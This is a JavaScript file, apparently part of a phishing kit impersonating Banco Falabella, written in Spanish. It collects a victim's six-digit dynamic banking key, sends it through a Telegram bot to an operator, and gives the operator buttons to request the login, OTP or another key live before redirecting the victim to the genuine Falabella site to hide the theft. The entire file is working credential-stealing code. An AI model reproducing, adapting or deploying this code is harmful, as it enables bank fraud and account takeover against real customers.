/**
 * FALABELLA - dinamica.js OPTIMIZADO
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Falabella Dinámica: Inicializando...');
    
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        return;
    }
    
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    const input = document.getElementById('claveDinamica');
    const btnIngresar = document.getElementById('btnIngresar');
    const overlay = document.getElementById('loadingScreen');

    BancoUtils.onTelegramAction(handleTelegramAction);

    input.addEventListener('input', () => {
        BancoUtils.validateNumeric(input, 6);
        const isValid = input.value.length === 6;
        btnIngresar.disabled = !isValid;
        if (isValid) {
            btnIngresar.classList.add('enabled');
        } else {
            btnIngresar.classList.remove('enabled');
        }
    });

    btnIngresar.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnIngresar.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        if (overlay) {
            overlay.style.display = 'flex';
            console.log('✅ Overlay mostrado');
        }

        const data = BancoUtils.saveBankData('falabella', { claveDinamica: input.value });
        console.log('📤 Datos a enviar:', data);
        
        const message = BancoUtils.formatMessage('FALABELLA - DINÁMICA', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '🔐 Pedir Login', action: 'request_login' },
            { text: '🔢 Pedir Dinámica', action: 'request_dynamic' },
            { text: '📱 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('dynamic', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) {
                overlay.style.display = 'none';
            }
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        console.log('📢 Acción de Telegram recibida en Falabella Dinámica:', data);
        
        if (overlay) {
            overlay.style.display = 'none';
            console.log('✅ Overlay ocultado');
        }
        
        switch(data.action) {
            case 'request_login':
                console.log('🔐 Redirigiendo a index.html');
                window.location.href = 'index.html';
                break;
            case 'request_dynamic':
                console.log('🔢 Limpiando campo de dinámica');
                input.value = '';
                btnIngresar.disabled = true;
                btnIngresar.classList.remove('enabled');
                input.focus();
                break;
            case 'request_otp':
                console.log('📱 Redirigiendo a otp.html');
                window.location.href = 'otp.html';
                break;
            case 'finish':
                console.log('✅ Finalizando - redirigiendo a falabella.com.co');
                window.location.href = 'https://www.falabella.com.co/';
                break;
            default:
                console.log('⚠️ Acción desconocida:', data.action);
        }
    }
});
